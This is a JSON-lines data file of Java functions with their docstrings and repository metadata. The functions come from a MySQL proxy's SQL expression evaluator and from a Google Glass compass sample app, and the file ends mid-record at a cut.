{"docstring": "/**\n * Returns the value of the expression as an object. The expression\n * tree is specified with its top node. The algorithm uses a stack \n * {@link com.meidusa.amoeba.sqljep.JepRuntime#stack} for evaluation.\n * <p>\n * An exception is thrown, if an error occurs during evaluation.\n * @return The value of the expression as an object.\n */\n", "func_signal": "public Comparable<?> getValue(Comparable<?>[] row) throws ParseException", "code": "{\n\tJepRuntime runtime = getThreadJepRuntime(this);\n\truntime.row = row;\n\tfor(Comparable<?> comparable :runtime.row){\n\t\tif(comparable instanceof ComparativeBaseList){\n\t\t\truntime.isMultValue = true;\n\t\t}\n\t}\n\ttry{\n\t\tif (!isValid()) {\n\t\t\tthrow new ParseException(\"Parser is not prepared\");\n\t\t}\n\t\tif (!hasError()) {\n\t\t\truntime.stack.setSize(0);\n\t\t\t// evaluate by letting the top node accept the visitor\n\t\t\tfor(Node node : nodes){\n\t\t\t\tnode.jjtAccept(this, null);\n\t\t\t}\n\t\t\t// something is wrong if not exactly one item remains on the stack\n\t\t\t// or if the error flag has been set\n\t\t\tif (runtime.stack.size() != 1) {\n\t\t\t\tthrow new ParseException(\"Wrong stack state. Stack size: \"+runtime.stack.size());\n\t\t\t}\n\t\n\t\t\t// return the value of the expression\n\t\t\treturn runtime.stack.pop();\n\t\t} else {\n\t\t\tthrow new ParseException(getErrorInfo());\n\t\t}\n\t}finally{\n\t\truntime.vars.clear();\n\t\truntime.stack.setSize(0);\n\t\truntime.isMultValue = false;\n\t}\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\BaseJEP.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Visit a function node. The values of the child nodes\n * are first pushed onto the stack. Then the function class associated\n * with the node is used to evaluate the function.\n */\n", "func_signal": "final public Object visit(ASTFunNode node, Object data) throws ParseException", "code": "{\n\tJepRuntime runtime = getThreadJepRuntime(this);\n\tPostfixCommandI pfmc = node.getPFMC();\n\n\t// check if the function class is set\n\tif (pfmc == null) {\n\t\tthrow new ParseException(\"No function class associated with \" + node.getName());\n\t}\n\n\t// evaluate all children (each leaves their result on the stack)\n\n\tif (debug) {\n\t\tSystem.out.println(\"Stack size after childrenAccept: \" + runtime.stack.size());\n\t}\n\t\n\tComparable<?>[] parameters = pfmc.evaluate(node, runtime);\n\t\n\tif(pfmc.isAutoBox()){\n\t\tComparativeBaseList list = null;\n\t\tint index = -1;\n\t\tfor(int i=0;i<parameters.length;i++){\n\t\t\tif(parameters[i] instanceof ComparativeBaseList){\n\t\t\t\tindex = i;\n\t\t\t\tlist = (ComparativeBaseList)parameters[i];\n\t\t\t\tbreak;\n\t\t\t}else{\n\t\t\t\t\n\t\t\t}\n\t\t}\n\t\t\n\t\tif(index >=0){\n\t\t\tfor(int i=0;i<parameters.length;i++){\n\t\t\t\tif(i != index){\n\t\t\t\t\tif(parameters[i] instanceof Comparative){\n\t\t\t\t\t\tparameters[i] =((Comparative) parameters[i]).getValue(); \n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\tfor(Comparative comp:list.getList()){\n\t\t\t\tparameters[index] = comp.getValue();\n\t\t\t\tComparable<?> value = pfmc.getResult(parameters);\n\t\t\t\tif(value instanceof Comparative){\n\t\t\t\t\tcomp.setComparison(((Comparative) value).getComparison());\n\t\t\t\t\tcomp.setValue(((Comparative) value).getValue());\n\t\t\t\t}else{\n\t\t\t\t\tcomp.setValue(value);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif(pfmc instanceof Declare){\n\t\t\t\tDeclare declare = (Declare) pfmc;\n\t\t\t\tdeclare.declare(runtime, list);\n\t\t\t}else{\n\t\t\t\truntime.stack.push(list);\n\t\t\t}\n\t\t}else{\n\t\t\t//\u5206\u6790\u6bcf\u4e2a\u53c2\u6570\u662f\u5426\u662f Comparative \u7c7b\u578b\n\t\t\tComparative lastComparative = null;\n\t\t\tfor(int i=0;i<parameters.length;i++){\n\t\t\t\tif(parameters[i] instanceof Comparative){\n\t\t\t\t\tlastComparative = ((Comparative) parameters[i]);\n\t\t\t\t\tparameters[i] =((Comparative) parameters[i]).getValue(); \n\t\t\t\t}\n\t\t\t}\n\n\t\t\tComparable<?> result = pfmc.getResult(parameters);\n\t\t\tif(lastComparative != null){\n\t\t\t\tlastComparative.setValue(result);\n\t\t\t\tresult = lastComparative;\n\t\t\t}\n\t\t\tif(pfmc instanceof Declare){\n\t\t\t\tDeclare declare = (Declare) pfmc;\n\t\t\t\tdeclare.declare(runtime, result);\n\t\t\t}else{\n\t\t\t\truntime.stack.push(result);\n\t\t\t}\n\t\t}\n\t}else{\n\t\tif(pfmc instanceof Declare){\n\t\t\tDeclare declare = (Declare) pfmc;\n\t\t\tdeclare.declare(runtime, pfmc.getResult(parameters));\n\t\t}else{\n\t\t\truntime.stack.push(pfmc.getResult(parameters));\n\t\t}\n\t}\n\t\n\t\n\tif (debug) {\n\t\tSystem.out.println(\"Stack size after run: \" + runtime.stack.size());\n\t}\n\treturn null;\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\BaseJEP.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Visit a variable node. The value of the variable is obtained from the\n * model and pushed onto the stack.\n */\n", "func_signal": "@SuppressWarnings(\"unchecked\")\nfinal public Object visit(ASTVarNode node, Object data) throws ParseException", "code": "{\n\tJepRuntime runtime = getThreadJepRuntime(this);\n\tif (node.index >= 0) {\n\t\tComparable value = getColumnObject(node.index);\n\t\tif(value instanceof Comparative){\n\t\t\tvalue = (Comparable)((Comparative)value).clone();\n\t\t}\n\t\truntime.stack.push(value);\n\t} else {\n\t\tif(node.variable == null){\n\t\t\tComparable comparable = runtime.vars.get(node.ident);\n\t\t\truntime.stack.push(comparable);\n\t\t}else{\n\t\t\truntime.stack.push(node.variable.getValue());\n\t\t}\n\t}\n\treturn null;\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\BaseJEP.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n* Change SQLJEP's state to initial state.\n* \n*/\n", "func_signal": "public void clear()", "code": "{\n\tnodes = null;\n\terrorList.clear();\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\BaseJEP.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/** Same behavior as JDK-1.5's Constants.characterValueOf(int) */\n", "func_signal": "public static Character characterValueOf(char c)", "code": "{\n\tif (c <= 127) {\n\t\treturn CHARACTER_CACHE[c];\n\t}\n\n\treturn new Character(c);\n}", "path": "com.vispractice.amoeba.mysql\\src\\com\\meidusa\\amoeba\\mysql\\io\\Constants.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Calculates the result of applying the \"+\" operator to the arguments from\n * the stack and pushes it back on the stack.\n */\n", "func_signal": "public Comparable<?>[] evaluate(ASTFunNode node, JepRuntime runtime) throws ParseException", "code": "{\n\tnode.childrenAccept(runtime.ev, null);\n\tComparable<?>  param2 = runtime.stack.pop();\n\tComparable<?>  param1 = runtime.stack.pop();\n\treturn new Comparable<?>[]{param1,param2};\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\function\\AddDate.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * {@inheritDoc}\n * . \u66ff\u6362\u4ece\u670d\u52a1\u5668\u7aef\u8fd4\u56de\u7684StatementID\uff0c\u518d\u53d1\u9001\u5230\u5ba2\u6237\u7aef\n */\n", "func_signal": "protected void dispatchMessageFrom(Connection fromConn,byte[] message)", "code": "{\n\tif(fromConn != source){\n\t\t//from mysql server\n\t\t//cache and buffered prepared messages , send merged messages\n\t\tif (commandType == QueryCommandPacket.COM_STMT_PREPARE) {\n\t\t\t\tpreparedStatmentInfo.addPacket(message);\n\t\t\t\tif(MysqlPacketBuffer.isEofPacket(message) && commandQueue.connStatusMap.get(fromConn).isCompleted()){\n\t\t\t\t\t this.source.postMessage(preparedStatmentInfo.getByteBuffer());\n\t\t\t\t}\n\t\t}\n\t}else{\n\t\t//from client\n\t\tsuper.dispatchMessageFrom(fromConn, message);\n\t}\n}", "path": "com.vispractice.amoeba.mysql\\src\\com\\meidusa\\amoeba\\mysql\\handler\\PreparedStatmentMessageHandler.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Parses the expression. \n * The root of the expression tree is returned by {@link #getTopNode()} method\n * @throws com.meidusa.amoeba.sqljep.ParseException If there are errors in the expression then it fires the exception\n */\n", "func_signal": "final public void parseExpression(Map<String,Integer> columnMapping,Map<String,Variable> variableMapping,final Map<String,PostfixCommand> funMap) throws ParseException", "code": "{\n\tReader reader = new StringReader(expression);\n\tParser parser = new Parser(reader){\n\n\t\t@Override\n\t\tpublic boolean containsKey(String key) {\n\t\t\treturn funMap.containsKey(key);\n\t\t}\n\n\t\t@Override\n\t\tpublic PostfixCommandI getFunction(String name) {\n\t\t\treturn funMap.get(name);\n\t\t}\n\t\t\n\t};\n\tparser.setColumnMapping(columnMapping);\n\tparser.setVariableMapping(variableMapping);\n\ttry {\n\t\t// try parsing\n\t\tnodes = parser.parseStream(reader);\n\t\terrorList.clear();\n\t\terrorList.addAll(parser.getErrorList());\n\t} catch (ParseException e) {\n\t\t// an exception was thrown, so there is no parse tree\n\t\tnodes = null;\n\t\terrorList.add(e.getMessage());\n\t} catch (Throwable e) {\n\t\tthrow new com.meidusa.amoeba.sqljep.ParseException(toString(), e);\n\t}\n\t\n\tif (hasError()) {\n\t\tthrow new com.meidusa.amoeba.sqljep.ParseException(getErrorInfo());\n\t}\n\t\n\t// If debug is enabled, print a dump of the tree to\n\t// standard output\n\tif (debug) {\n\t\tParserVisitor v = new ParserDumpVisitor();\n\t\ttry {\n\t\t\tfor(Node node : nodes){\n\t\t\t\tnode.jjtAccept(v, null);\n\t\t\t}\n\t\t} catch (ParseException e) {\n\t\t\terrorList.add(e.getMessage());\n\t\t\te.printStackTrace();\n\t\t}\n\t}\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\BaseJEP.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/** Same behavior as JDK-1.5's Integer.valueOf(int) */\n", "func_signal": "public static final Integer integerValueOf(int i)", "code": "{\n\tif (i >= -128 && i <= 127) {\n\t\treturn INTEGER_CACHE[i + INTEGER_CACHE_OFFSET];\n\t}\n\n\treturn new Integer(i);\n}", "path": "com.vispractice.amoeba.mysql\\src\\com\\meidusa\\amoeba\\mysql\\io\\Constants.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Prints this <code>Throwable</code> and its backtrace to the specified\n * print writer.\n * \n * @param s  <code>PrintWriter</code> to use for output\n * @since JDK1.1\n */\n", "func_signal": "public void printStackTrace(PrintWriter s)", "code": "{\n    super.printStackTrace(s);\n\n    if (throwable != null) {\n        s.println(\"with nested exception \" + throwable);\n        throwable.printStackTrace(s);\n    }\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\exception\\AmoebaRuntimeException.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Constructs a <code>AmoebaRuntimeException</code> with the specified\n * detail message.\n * \n * @param s the detail message.\n */\n", "func_signal": "public AmoebaRuntimeException(String s, Throwable cause)", "code": "{\n    super(s);\n    this.throwable = cause;\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\exception\\AmoebaRuntimeException.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/** Same behavior as JDK-1.5's Constants.shortValueOf(int) */\n", "func_signal": "public static Short shortValueOf(short s)", "code": "{\n\n\tif (s >= -128 && s <= 127) {\n\t\treturn SHORT_CACHE[s + SHORT_CACHE_OFFSET];\n\t}\n\t\n\treturn new Short(s);\n}", "path": "com.vispractice.amoeba.mysql\\src\\com\\meidusa\\amoeba\\mysql\\io\\Constants.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n* Creates a string containing the variable's name and value\n*/\n", "func_signal": "public String toString()", "code": "{\n\tif (variable == null) {\n\t\treturn \"Column: \"+index;\n\t} else {\n\t\treturn \"Variable: \\\"\" + (variable == null ? \"null\" : variable.getValue().toString())+ \"\\\"\";\n\t}\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\ASTVarNode.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Visit a constant node. The value of the constant is pushed onto the\n * stack.\n */\n", "func_signal": "final public Object visit(ASTConstant node, Object data) throws ParseException", "code": "{\n\tJepRuntime runtime = getThreadJepRuntime(this);\n\truntime.stack.push((Comparable<?>)node.value);\n\treturn null;\n}", "path": "com.vispractice.amoeba.base\\src\\com\\meidusa\\amoeba\\sqljep\\BaseJEP.java", "repo_name": "vispractice/Amoeba-Plus-For-MySQL", "stars": 81, "license": "None", "language": "java", "size": 33559}
{"docstring": "/**\n * Animates the view to the specified heading, or simply redraws it immediately if the\n * difference between the current heading and new heading are small enough that it wouldn't be\n * noticeable.\n *\n * @param end the desired heading\n */\n", "func_signal": "private void animateTo(float end)", "code": "{\n    // Only act if the animator is not currently running. If the user's orientation changes\n    // while the animator is running, we wait until the end of the animation to update the\n    // display again, to prevent jerkiness.\n    if (!mAnimator.isRunning()) {\n        float start = mAnimatedHeading;\n        float distance = Math.abs(end - start);\n        float reverseDistance = 360.0f - distance;\n        float shortest = Math.min(distance, reverseDistance);\n\n        if (Float.isNaN(mAnimatedHeading) || shortest < MIN_DISTANCE_TO_ANIMATE) {\n            // If the distance to the destination angle is small enough (or if this is the\n            // first time the compass is being displayed), it will be more fluid to just redraw\n            // immediately instead of doing an animation.\n            mAnimatedHeading = end;\n            invalidate();\n        } else {\n            // For larger distances (i.e., if the compass \"jumps\" because of sensor calibration\n            // issues), we animate the effect to provide a more fluid user experience. The\n            // calculation below finds the shortest distance between the two angles, which may\n            // involve crossing 0/360 degrees.\n            float goal;\n\n            if (distance < reverseDistance) {\n                goal = end;\n            } else if (end < start) {\n                goal = end + 360.0f;\n            } else {\n                goal = end - 360.0f;\n            }\n\n            mAnimator.setFloatValues(start, goal);\n            mAnimator.start();\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassView.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Requests that the views redo their layout. This must be called manually every time the\n * tips view's text is updated because this layout doesn't exist in a GUI thread where those\n * requests will be enqueued automatically.\n */\n", "func_signal": "private void doLayout()", "code": "{\n    // Measure and update the layout so that it will take up the entire surface space\n    // when it is drawn.\n    int measuredWidth = View.MeasureSpec.makeMeasureSpec(mSurfaceWidth,\n            View.MeasureSpec.EXACTLY);\n    int measuredHeight = View.MeasureSpec.makeMeasureSpec(mSurfaceHeight,\n            View.MeasureSpec.EXACTLY);\n\n    mLayout.measure(measuredWidth, measuredHeight);\n    mLayout.layout(0, 0, mLayout.getMeasuredWidth(), mLayout.getMeasuredHeight());\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassRenderer.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Converts a JSON object that represents a place into a {@link Place} object.\n */\n", "func_signal": "private Place jsonObjectToPlace(JSONObject object)", "code": "{\n    String name = object.optString(\"name\");\n    double latitude = object.optDouble(\"latitude\", Double.NaN);\n    double longitude = object.optDouble(\"longitude\", Double.NaN);\n\n    if (!name.isEmpty() && !Double.isNaN(latitude) && !Double.isNaN(longitude)) {\n        return new Place(latitude, longitude, name);\n    } else {\n        return null;\n    }\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\model\\Landmarks.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Creates a new instance of the {@code CompassRenderer} with the specified context,\n * orientation manager, and landmark collection.\n */\n", "func_signal": "public CompassRenderer(Context context, OrientationManager orientationManager,\n            Landmarks landmarks)", "code": "{\n    LayoutInflater inflater = LayoutInflater.from(context);\n    mLayout = (FrameLayout) inflater.inflate(R.layout.compass, null);\n    mLayout.setWillNotDraw(false);\n\n    mCompassView = (CompassView) mLayout.findViewById(R.id.compass);\n    mTipsContainer = (RelativeLayout) mLayout.findViewById(R.id.tips_container);\n    mTipsView = (TextView) mLayout.findViewById(R.id.tips_view);\n\n    mOrientationManager = orientationManager;\n    mLandmarks = landmarks;\n\n    mCompassView.setOrientationManager(mOrientationManager);\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassRenderer.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Starts or stops rendering according to the {@link LiveCard}'s state.\n */\n", "func_signal": "private void updateRenderingState()", "code": "{\n    boolean shouldRender = (mHolder != null) && !mRenderingPaused;\n    boolean isRendering = (mRenderThread != null);\n\n    if (shouldRender != isRendering) {\n        if (shouldRender) {\n            mOrientationManager.addOnChangedListener(mCompassListener);\n            mOrientationManager.start();\n\n            if (mOrientationManager.hasLocation()) {\n                Location location = mOrientationManager.getLocation();\n                List<Place> nearbyPlaces = mLandmarks.getNearbyLandmarks(\n                    location.getLatitude(), location.getLongitude());\n                mCompassView.setNearbyPlaces(nearbyPlaces);\n            }\n\n            mRenderThread = new RenderThread();\n            mRenderThread.start();\n        } else {\n            mRenderThread.quit();\n            mRenderThread = null;\n\n            mOrientationManager.removeOnChangedListener(mCompassListener);\n            mOrientationManager.stop();\n\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassRenderer.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Initializes a new {@code Landmarks} object by loading the landmarks from the resource\n * bundle.\n */\n", "func_signal": "public Landmarks(Context context)", "code": "{\n    mPlaces = new ArrayList<Place>();\n\n    // This class will be instantiated on the service's main thread, and doing I/O on the\n    // main thread can be dangerous if it will block for a noticeable amount of time. In\n    // this case, we assume that the landmark data will be small enough that there is not\n    // a significant penalty to the application. If the landmark data were much larger,\n    // we may want to load it in the background instead.\n    String jsonString = readLandmarksResource(context);\n    populatePlaceList(jsonString);\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\model\\Landmarks.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Gets the relative bearing from one geographical coordinate to another.\n *\n * @param latitude1 the latitude of the source point\n * @param longitude1 the longitude of the source point\n * @param latitude2 the latitude of the destination point\n * @param longitude2 the longitude of the destination point\n * @return the relative bearing from point 1 to point 2, in degrees. The result is guaranteed\n *         to fall in the range 0-360\n */\n", "func_signal": "public static float getBearing(double latitude1, double longitude1, double latitude2,\n        double longitude2)", "code": "{\n    latitude1 = Math.toRadians(latitude1);\n    longitude1 = Math.toRadians(longitude1);\n    latitude2 = Math.toRadians(latitude2);\n    longitude2 = Math.toRadians(longitude2);\n\n    double dLon = longitude2 - longitude1;\n\n    double y = Math.sin(dLon) * Math.cos(latitude2);\n    double x = Math.cos(latitude1) * Math.sin(latitude2) - Math.sin(latitude1)\n            * Math.cos(latitude2) * Math.cos(dLon);\n\n    double bearing = Math.atan2(y, x);\n    return mod((float) Math.toDegrees(bearing), 360.0f);\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\util\\MathUtils.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Gets the great circle distance in kilometers between two geographical points, using\n * the <a href=\"http://en.wikipedia.org/wiki/Haversine_formula\">haversine formula</a>.\n *\n * @param latitude1 the latitude of the first point\n * @param longitude1 the longitude of the first point\n * @param latitude2 the latitude of the second point\n * @param longitude2 the longitude of the second point\n * @return the distance, in kilometers, between the two points\n */\n", "func_signal": "public static float getDistance(double latitude1, double longitude1, double latitude2,\n        double longitude2)", "code": "{\n    double dLat = Math.toRadians(latitude2 - latitude1);\n    double dLon = Math.toRadians(longitude2 - longitude1);\n    double lat1 = Math.toRadians(latitude1);\n    double lat2 = Math.toRadians(latitude2);\n    double sqrtHaversineLat = Math.sin(dLat / 2);\n    double sqrtHaversineLon = Math.sin(dLon / 2);\n    double a = sqrtHaversineLat * sqrtHaversineLat + sqrtHaversineLon * sqrtHaversineLon\n            * Math.cos(lat1) * Math.cos(lat2);\n    double c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));\n\n    return (float) (EARTH_RADIUS_KM * c);\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\util\\MathUtils.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Converts the specified heading angle into an index between 0-15 that can be used to retrieve\n * the direction name for that heading (known as \"boxing the compass\", down to the half-wind\n * level).\n *\n * @param heading the heading angle\n * @return the index of the direction name for the angle\n */\n", "func_signal": "public static int getHalfWindIndex(float heading)", "code": "{\n    float partitionSize = 360.0f / NUMBER_OF_HALF_WINDS;\n    float displacedHeading = MathUtils.mod(heading + partitionSize / 2, 360.0f);\n    return (int) (displacedHeading / partitionSize);\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\util\\MathUtils.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Gets a list of landmarks that are within ten kilometers of the specified coordinates. This\n * function will never return null; if there are no locations within that threshold, then an\n * empty list will be returned.\n */\n", "func_signal": "public List<Place> getNearbyLandmarks(double latitude, double longitude)", "code": "{\n    ArrayList<Place> nearbyPlaces = new ArrayList<Place>();\n\n    for (Place knownPlace : mPlaces) {\n        if (MathUtils.getDistance(latitude, longitude,\n                knownPlace.getLatitude(), knownPlace.getLongitude()) <= MAX_DISTANCE_KM) {\n            nearbyPlaces.add(knownPlace);\n        }\n    }\n\n    return nearbyPlaces;\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\model\\Landmarks.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Initializes a new place with the specified coordinates and name.\n *\n * @param latitude the latitude of the place\n * @param longitude the longitude of the place\n * @param name the name of the place\n */\n", "func_signal": "public Place(double latitude, double longitude, String name)", "code": "{\n    mLatitude = latitude;\n    mLongitude = longitude;\n    mName = name;\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\model\\Place.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Shows or hides the tip view with an appropriate message based on the current accuracy of the\n * compass.\n */\n", "func_signal": "private void updateTipsView()", "code": "{\n    int stringId = 0;\n\n    // Only one message (with magnetic interference being higher priority than pitch too steep)\n    // will be displayed in the tip.\n    if (mInterference) {\n        stringId = R.string.magnetic_interference;\n    } else if (mTooSteep) {\n        stringId = R.string.pitch_too_steep;\n    }\n\n    boolean show = (stringId != 0);\n\n    if (show) {\n        mTipsView.setText(stringId);\n        doLayout();\n    }\n\n    if (mTipsContainer.getAnimation() == null) {\n        float newAlpha = (show ? 1.0f : 0.0f);\n        mTipsContainer.animate().alpha(newAlpha).start();\n    }\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassRenderer.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Read the current heading aloud using the text-to-speech engine.\n */\n", "func_signal": "public void readHeadingAloud()", "code": "{\n    float heading = mOrientationManager.getHeading();\n\n    Resources res = getResources();\n    String[] spokenDirections = res.getStringArray(R.array.spoken_directions);\n    String directionName = spokenDirections[MathUtils.getHalfWindIndex(heading)];\n\n    int roundedHeading = Math.round(heading);\n    int headingFormat;\n    if (roundedHeading == 1) {\n        headingFormat = R.string.spoken_heading_format_one;\n    } else {\n        headingFormat = R.string.spoken_heading_format;\n    }\n\n    String headingText = res.getString(headingFormat, roundedHeading, directionName);\n    mSpeech.speak(headingText, TextToSpeech.QUEUE_FLUSH, null);\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassService.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Repaints the compass.\n */\n", "func_signal": "private synchronized void repaint()", "code": "{\n    Canvas canvas = null;\n\n    try {\n        canvas = mHolder.lockCanvas();\n    } catch (RuntimeException e) {\n        Log.d(TAG, \"lockCanvas failed\", e);\n    }\n\n    if (canvas != null) {\n        canvas.drawColor(Color.BLACK);\n        mLayout.draw(canvas);\n\n        try {\n            mHolder.unlockCanvasAndPost(canvas);\n        } catch (RuntimeException e) {\n            Log.d(TAG, \"unlockCanvasAndPost failed\", e);\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassRenderer.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Draws the compass direction strings (N, NW, W, etc.).\n *\n * @param canvas the {@link Canvas} upon which to draw\n * @param pixelsPerDegree the size, in pixels, of one degree step\n */\n", "func_signal": "private void drawCompassDirections(Canvas canvas, float pixelsPerDegree)", "code": "{\n    float degreesPerTick = 360.0f / mDirections.length;\n\n    mPaint.setColor(Color.WHITE);\n\n    // We draw two extra ticks/labels on each side of the view so that the\n    // full range is visible even when the heading is approximately 0.\n    for (int i = -2; i <= mDirections.length + 2; i++) {\n        if (MathUtils.mod(i, 2) == 0) {\n            // Draw a text label for the even indices.\n            String direction = mDirections[MathUtils.mod(i, mDirections.length)];\n            mPaint.getTextBounds(direction, 0, direction.length(), mTextBounds);\n\n            canvas.drawText(direction,\n                    i * degreesPerTick * pixelsPerDegree - mTextBounds.width() / 2,\n                    mTextBounds.height() / 2, mPaint);\n        } else {\n            // Draw a tick mark for the odd indices.\n            canvas.drawLine(i * degreesPerTick * pixelsPerDegree, -TICK_HEIGHT / 2, i\n                    * degreesPerTick * pixelsPerDegree, TICK_HEIGHT / 2, mTickPaint);\n        }\n    }\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\CompassView.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Reads the text from {@code res/raw/landmarks.json} and returns it as a string.\n */\n", "func_signal": "private static String readLandmarksResource(Context context)", "code": "{\n    InputStream is = context.getResources().openRawResource(R.raw.landmarks);\n    StringBuffer buffer = new StringBuffer();\n\n    try {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(is));\n\n        String line;\n        while ((line = reader.readLine()) != null) {\n            buffer.append(line);\n            buffer.append('\\n');\n        }\n    } catch (IOException e) {\n        Log.e(TAG, \"Could not read landmarks resource\", e);\n        return null;\n    } finally {\n        if (is != null) {\n            try {\n                is.close();\n            } catch (IOException e) {\n                Log.e(TAG, \"Could not close landmarks resource stream\", e);\n            }\n        }\n    }\n\n    return buffer.toString();\n}", "path": "app\\src\\main\\java\\com\\google\\android\\glass\\sample\\compass\\model\\Landmarks.java", "repo_name": "googleglass/gdk-compass-sample", "stars": 126, "license": "apache-2.0", "language": "java", "size": 305}
{"docstring": "/**\n * Draws the pins and text labels for the nearby list of places.\n *\n * @param canvas the {@link Canvas} upon which to draw\n * @param pixelsPerDegree the size, in pixels, of one degree step\n * @param offset the number of pixels to translate the drawing operations by in the horizontal\n *         direction; used because place names are drawn three times to get proper wraparound\n */\n", "func_signal": "private void drawPlaces(Canvas canvas, float pixelsPerDegree, float offset)", "code": "{\n    if (mOrientation.hasLocation() && mNearbyPlaces != null) {\n        synchronized (mNearbyPlaces) {\n            Location userLocation = mOrientation.getLocation();\n            double latitude1 = userLocation.getLatitude();\n            double longitude1 = userLocation.getLongitude();\n\n            mAllBounds.clear();\n\n            // Loop over the list of nearby places (those within 10 km of the user's current\n            // location), and compute the relative bearing from the user's location to the\n            // place's location. This determines the position on the compass view where the\n            // pin will be drawn.\n            for (Place place : mNearbyPlaces) {\n                double latitude2 = place.getLatitude();\n                double longitude2 = place.getLongitude();\n                float bearing = MathUtils.getBearing(latitude1, longitude1, latitude2,\n                        longitude2);\n\n                String name = place.getName();\n                double distanceKm = MathUtils.getDistance(latitude1, longitude1, latitude2,\n                        longitude2);\n                String text = 